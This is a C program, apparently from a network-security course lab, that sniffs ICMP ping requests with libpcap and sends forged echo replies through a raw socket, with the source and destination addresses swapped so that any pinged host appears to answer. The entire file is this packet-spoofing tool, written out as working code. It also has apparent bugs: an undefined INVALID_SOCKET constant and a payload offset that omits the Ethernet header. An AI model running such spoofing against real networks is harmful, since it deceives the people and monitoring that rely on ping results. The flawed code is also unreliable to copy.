#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <pcap.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

void packetSniffer(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
unsigned short in_cksum(unsigned short *buf, int length);
void send_raw_ip_packet(struct iphdr *iph);

int main() {
    struct bpf_program filter;

    pcap_t *handle;

    char dev[] = "enp0s3";
    char error_buffer[PCAP_ERRBUF_SIZE];
    char filter_exp[] = "icmp";

    bpf_u_int32 subnet_mask, ip;

    printf("    Snooper Application;  Copyright (C) 2023  Roy Simanovich and Yuval Yurzdichinsky\n"
            "This program comes with ABSOLUTELY NO WARRANTY.\n"
            "This is free software, and you are welcome to redistribute it\n"
            "under certain conditions; see `LICENSE' for details.\n");

    if (pcap_lookupnet(dev, &ip, &subnet_mask, error_buffer) == -1)
    {
        printf("Could not get information for device: %s\n", dev);
        ip = 0;
        subnet_mask = 0;
    }

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, error_buffer);

    if (handle == NULL)
    {
        printf("Could not open %s - %s\n", dev, error_buffer);
        exit(1);
    }
    if (pcap_compile(handle, &filter, filter_exp, 0, ip) == -1) 
    {
        printf("Bad filter - %s\n", pcap_geterr(handle));
        exit(1);
    }
    if (pcap_setfilter(handle, &filter) == -1)
    {
        printf("Error setting filter - %s\n", pcap_geterr(handle));
        exit(1);
    }

    printf("Listening to interface \"%s\" with filter \"%s\"...\n", dev, filter_exp);
    printf("----------------------------------------------------------\n");

    pcap_loop(handle, -1, packetSniffer, NULL);                

    pcap_close(handle);

    return 0;
}

void packetSniffer(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct ethhdr* ethheader = (struct ethhdr*)packet;
    struct iphdr* iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
    struct icmphdr* icmph = (struct icmphdr*)(packet + sizeof(struct ethhdr) + iph->ihl*4);

    // Filter non ping packets
    if (icmph->type != ICMP_ECHO)
        return;

    char buffer[1500] = { 0 };

    struct iphdr* iph_spoofed = (struct iphdr*)(buffer);
    struct icmphdr* icmph_spoofed = (struct icmphdr*)(buffer + iph->ihl*4);

    int msg_size = ntohs(iph->tot_len) - iph->ihl*4 - sizeof(struct icmphdr);
    printf("msg_size = %d\n", msg_size);

    if (msg_size > 0)
    {
        memcpy
        (
            (buffer + iph->ihl*4 + sizeof(struct icmphdr)), 
            (packet + iph->ihl*4 + sizeof(struct icmphdr)), 
            msg_size
        );
    }

    iph_spoofed->ihl = iph->ihl;
    iph_spoofed->version = iph->version;
    iph_spoofed->tos = iph->tos;
    iph_spoofed->tot_len = iph->tot_len;
    iph_spoofed->id = iph->id;
    iph_spoofed->frag_off = iph->frag_off;
    iph_spoofed->ttl = iph->ttl;
    iph_spoofed->protocol = iph->protocol;
    iph_spoofed->saddr = iph->daddr;
    iph_spoofed->daddr = iph->saddr;

    icmph_spoofed->type = ICMP_ECHOREPLY;
    icmph_spoofed->code = 0;
    icmph_spoofed->un.echo.id = icmph->un.echo.id;
    icmph_spoofed->un.echo.sequence = icmph->un.echo.sequence;
    icmph_spoofed->checksum = 0;
    icmph_spoofed->checksum = in_cksum((unsigned short *)icmph_spoofed, sizeof(struct icmphdr) + msg_size);

    send_raw_ip_packet(iph_spoofed);
    printf("fake pong sent\n");
}

unsigned short in_cksum(unsigned short *buf, int length){
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;

	/*
	 * The algorithm uses a 32 bit accumulator (sum), adds
	 * sequential 16 bit words to it, and at the end, folds back all
	 * the carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}

	/* treat the odd byte at the end, if any */
	if (nleft == 1)
	{
		*(u_char *)(&temp) = *(u_char *)w;
		sum += temp;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
	sum += (sum >> 16);					// add carry
	return (unsigned short)(~sum);
}

void send_raw_ip_packet(struct iphdr *iph) {
	struct sockaddr_in dest_info;
	int socketfd = INVALID_SOCKET, enable = 1;

	dest_info.sin_family = AF_INET;
	dest_info.sin_addr.s_addr = iph->daddr;

	if ((socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == INVALID_SOCKET)
	{
		perror("socket");
		exit(errno);
	}

	if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == INVALID_SOCKET)
	{
		perror("socket");
		exit(errno);
	}

	if (sendto(socketfd, iph, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) == INVALID_SOCKET)
	{
		perror("sendto");
		exit(errno);
	}

	close(socketfd);
}